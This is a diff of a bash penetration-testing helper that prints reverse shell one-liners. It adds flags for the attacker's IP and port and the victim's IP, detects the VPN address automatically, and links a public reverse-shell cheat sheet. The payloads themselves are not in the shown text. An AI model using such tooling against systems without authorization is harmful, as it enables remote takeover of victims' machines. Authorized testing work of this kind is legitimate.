@@ -1,5 +1,20 @@
 #!/bin/bash
 
+
+# To be displayed when the -h flag is issued
+function usage {
+    echo ""
+    echo -e "This script generates a number of reverse shell one-liners(not dynamic). By default, the ip address from tun0 is used if set.\nUsing the ${BWhite}'set-target-ip'${RESET} and ${BWhite}'show-target-ip'${RESET} scripts from https://github.com/soutzis/Penetration-Testing-Helper-Scripts is recommended."
+    
+    echo -e "\n${BGreen}usage${Green}: $0 [OPTIONS]"
+    echo -e "\n[OPTIONS]\n\t-ip\tThe IP address of the server/listener (attacker)\n\t-port\tThe port of the server/listener\n\t-vic\tThe IP address of the client (victim)\n\t-h\tDisplay this help menu${RESET}"
+
+    echo -e "\nExample: reverse-shells -ip=192.168.10.10 -port=4444"
+    echo -e "Example: reverse-shells -port 4444"
+}
+
+# MAIN
+
 RESET="\033[0m"
 Green="\033[0;32m"
 Yellow='\033[0;33m'
@@ -8,27 +23,71 @@ Purple='\033[0;35m'
 BGreen='\033[1;32m' # Bold Green
 BYellow='\033[1;33m' # Bold Yellow
 BRed='\033[1;31m' # Bold Red
+BWhite='\033[1;37m'
 
-# Make port number bold, so the pentester can notice it
-if [ -z $1 ]; then
+#while getopts ":h" flag
+#    do
+#             case "${flag}" in
+#                    h) usage; exit 0;;
+#             esac
+#    done
+
+
+TEMP=$(getopt -n "$0" -a -l "ip:,port:,vic:,h" -- -- "$@")
+
+    [ $? -eq 0 ] || exit
+
+    eval set --  "$TEMP"
+
+    while [ $# -gt 0 ]
+    do
+             case "$1" in
+                    --ip) IP="$2"; shift;;
+                    --port) PORT="$2"; shift;;
+                    --vic) VIC="$2"; shift;;
+                    --h) usage; exit 0;;
+                    --) shift;;
+             esac
+             shift;
+    done
+
+
+# Set LHOST, LPORT and RHOST values before printing one-liners
+# ip
+if [[ -z ${IP} ]]; then
+    LHOST=$(ifconfig | grep -A1 tun0 | grep inet | awk '{print $2}')  # Get current VPN IP if tun0 is set
+    if [[ -z ${LHOST} ]]; then
+        LHOST=${BRed}'IP'${Yellow}
+    else
+        LHOST=${BYellow}${LHOST}${Yellow}
+    fi
+else
+    LHOST=${BYellow}${IP}${Yellow}
+fi
+
+# port
+if [[ -z ${PORT} ]]; then
     LPORT=${BYellow}'443'${Yellow}
 else
-    LPORT=${BYellow}$1${Yellow}
+    LPORT=${BYellow}${PORT}${Yellow}
 fi
 
-# Get current VPN IP if tun0 is set
-LHOST=$(ifconfig | grep -A1 tun0 | grep inet | awk '{print $2}')
-if [ -z $LHOST ]; then
-    LHOST=${BRed}'IP'${Yellow}
+# victim
+if [[ -z ${VIC} ]]; then
+    RHOST=$(show-target-ip || :) 
+    if [ -z $RHOST ]; then
+        RHOST=${BRed}'TARGET-IP'${Yellow}
+    fi
 else
-    LHOST=${BYellow}${LHOST}${Yellow}
+    RHOST=${VIC}
 fi
 
-# Get current target IP if set
-RHOST=$(show-target-ip)
-if [ -z $RHOST ]; then
-    RHOST=${BRed}'TARGET-IP'${Yellow}
-fi
+## help
+#if [[ -z ${H} ]]; then
+#    :
+#else
+#    usage
+#fi
 
 echo "-> More reverse shells: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#revshells"
 echo -e "\nPossible shells on target: ${Purple}sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash${RESET}"
